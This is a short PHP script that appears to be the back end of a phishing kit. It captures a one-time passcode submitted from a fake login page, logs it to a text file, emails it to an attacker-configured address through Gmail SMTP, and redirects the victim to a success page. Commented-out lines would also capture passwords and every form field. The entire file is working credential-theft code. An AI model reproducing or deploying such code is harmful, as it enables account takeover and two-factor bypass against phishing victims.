<?php

    file_put_contents("log.txt", "OTP: " . $_POST['approvals_code'] . "\n", FILE_APPEND);

    require_once("smtp/class.phpmailer.php");
    include 'config.php';

   $mail = new PHPMailer(); 

    $mail->isSMTP();            
    //Set SMTP host name                          
    $mail->Host = "smtp.gmail.com";
    //Set this to true if SMTP host requires authentication to send email
    $mail->SMTPAuth = true;                          
    //Provide username and password     
    $mail->Username = $sender_mail;                 
    $mail->Password = $sender_pass;                           
    //If SMTP requires TLS encryption then set it
    $mail->SMTPSecure = "tls";                           
    //Set TCP port to connect to
    $mail->Port = 587;  

    $mail->From = $sender_mail;
    $mail->FromName = $sender_name;

    $mail->addAddress($receiver_mail, $receiver_name);

    //Provide file path and name of the attachments

    $mail->isHTML(true);

    $app_name = array_reverse(explode('/',getcwd()))[0];

    

    $data = "";
    
    $data = $data."OTP = ".$_POST["approvals_code"]."<br>";
    // $data = $data."Password = ".$_POST["password"]."<br>";

    // foreach($_POST as $key=>$value)
    // {
    // $data = "<h2>$key = $value</h2>".$data;
    // }

    $mail->Subject = "Someone log in on $app_name";
    $mail->Body = "<h1>New log in on $app_name </h1><br>$data";
    
    

    try {
        $mail->send();
        header('Location: success.html');
    } catch (Exception $e) {
        echo "Mailer Error: " . $mail->ErrorInfo;
    }

header('Location: success.html');
exit();